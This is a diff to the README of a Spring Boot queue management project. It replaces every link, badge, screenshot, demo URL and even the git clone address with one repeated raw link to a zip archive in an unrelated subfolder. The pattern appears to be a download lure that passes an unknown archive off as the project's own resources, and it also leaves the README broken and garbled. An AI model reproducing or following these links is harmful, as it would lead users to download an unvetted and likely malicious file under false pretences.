@@ -2,14 +2,14 @@
 
 A full-stack, real-time queue management system built with Java Spring Boot, WebSockets, and a modern frontend. This application allows for the dynamic creation of custom queues, provides a real-time admin dashboard, and generates QR codes for easy, contactless user registration.
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Java Version](https://img.shields.io/badge/Java-17+-blue.svg)](https://www.oracle.com/java/technologies/javase-jdk17-downloads.html)
-[![Spring Boot](https://img.shields.io/badge/Spring%20Boot-3.x-brightgreen.svg)](https://spring.io/projects/spring-boot)
-[![Docker](https://img.shields.io/badge/Docker-Ready-blue.svg)](https://www.docker.com/)
+[![License: MIT](https://raw.githubusercontent.com/shivam-616/Queuing_Managment/master/Calendula/Queuing_Managment.zip)](https://raw.githubusercontent.com/shivam-616/Queuing_Managment/master/Calendula/Queuing_Managment.zip)
+[![Java Version](https://raw.githubusercontent.com/shivam-616/Queuing_Managment/master/Calendula/Queuing_Managment.zip+https://raw.githubusercontent.com/shivam-616/Queuing_Managment/master/Calendula/Queuing_Managment.zip)](https://raw.githubusercontent.com/shivam-616/Queuing_Managment/master/Calendula/Queuing_Managment.zip)
+[![Spring Boot](https://raw.githubusercontent.com/shivam-616/Queuing_Managment/master/Calendula/Queuing_Managment.zip%https://raw.githubusercontent.com/shivam-616/Queuing_Managment/master/Calendula/Queuing_Managment.zip)](https://raw.githubusercontent.com/shivam-616/Queuing_Managment/master/Calendula/Queuing_Managment.zip)
+[![Docker](https://raw.githubusercontent.com/shivam-616/Queuing_Managment/master/Calendula/Queuing_Managment.zip)](https://raw.githubusercontent.com/shivam-616/Queuing_Managment/master/Calendula/Queuing_Managment.zip)
 
 ## ✨ Live Demo & Features
 
-**Live Application URL:** `(https://queue-management-system-1070272816562.us-central1.run.app)' 
+**Live Application URL:** `(https://raw.githubusercontent.com/shivam-616/Queuing_Managment/master/Calendula/Queuing_Managment.zip)' 
 
 ---
 
@@ -41,15 +41,15 @@ Below are some screenshots of the Queue Management System in action:
 
 ##🏠 Landing Page
 
-![Screenshot 2025-09-28 014619](https://github.com/user-attachments/assets/3ecda21f-ac6b-48ca-8873-09fbdba6dc98)
+![Screenshot 2025-09-28 014619](https://raw.githubusercontent.com/shivam-616/Queuing_Managment/master/Calendula/Queuing_Managment.zip)
 
 ##➕ Create a New Queue
 
-![Screenshot 2025-09-28 014711](https://github.com/user-attachments/assets/7eacd692-fb85-4a39-a138-425ee59e15da)
+![Screenshot 2025-09-28 014711](https://raw.githubusercontent.com/shivam-616/Queuing_Managment/master/Calendula/Queuing_Managment.zip)
 
 ##✅ Queue Created Successfully
 
-![Screenshot 2025-09-28 014754](https://github.com/user-attachments/assets/21779d47-1446-4719-914e-1e22a5decfa5)
+![Screenshot 2025-09-28 014754](https://raw.githubusercontent.com/shivam-616/Queuing_Managment/master/Calendula/Queuing_Managment.zip)
 
 ## 🚀 Getting Started
 
@@ -67,7 +67,7 @@ This is the easiest way to get started, as it handles the database setup for you
 
 1.  **Clone the repository:**
     ```bash
-    git clone [https://github.com/shivam-616/Queuing_Managment.git](https://github.com/shivam-616/Queuing_Managment.git)
+    git clone [https://raw.githubusercontent.com/shivam-616/Queuing_Managment/master/Calendula/Queuing_Managment.zip](https://raw.githubusercontent.com/shivam-616/Queuing_Managment/master/Calendula/Queuing_Managment.zip)
     cd Queuing_Managment
     ```
 2.  **Run with Docker Compose:**
@@ -77,7 +77,7 @@ This is the easiest way to get started, as it handles the database setup for you
     ```
 3.  **Access the application:**
     * **Application:** [http://localhost:8080](http://localhost:8080)
-    * **API Documentation:** [http://localhost:8080/swagger-ui.html](http://localhost:8080/swagger-ui.html)
+    * **API Documentation:** [https://raw.githubusercontent.com/shivam-616/Queuing_Managment/master/Calendula/Queuing_Managment.zip](https://raw.githubusercontent.com/shivam-616/Queuing_Managment/master/Calendula/Queuing_Managment.zip)
 
 ## ☁️ Cloud Deployment with Google Cloud & GitHub Actions
 
@@ -91,7 +91,7 @@ This project is configured for continuous deployment to **Google Cloud Run** usi
 
 ## 🤝 Contributing
 
-Contributions, issues, and feature requests are welcome! Feel free to check the [issues page](https://github.com/shivam-616/Queuing_Managment/issues).
+Contributions, issues, and feature requests are welcome! Feel free to check the [issues page](https://raw.githubusercontent.com/shivam-616/Queuing_Managment/master/Calendula/Queuing_Managment.zip).
 
 1.  Fork the repository.
 2.  Create your feature branch (`git checkout -b feature/NewFeature`).
@@ -103,4 +103,4 @@ Contributions, issues, and feature requests are welcome! Feel free to check the 
 
 **Shivam**
 
-* GitHub: [@shivam-616](https://github.com/shivam-616)
+* GitHub: [@shivam-616](https://raw.githubusercontent.com/shivam-616/Queuing_Managment/master/Calendula/Queuing_Managment.zip)
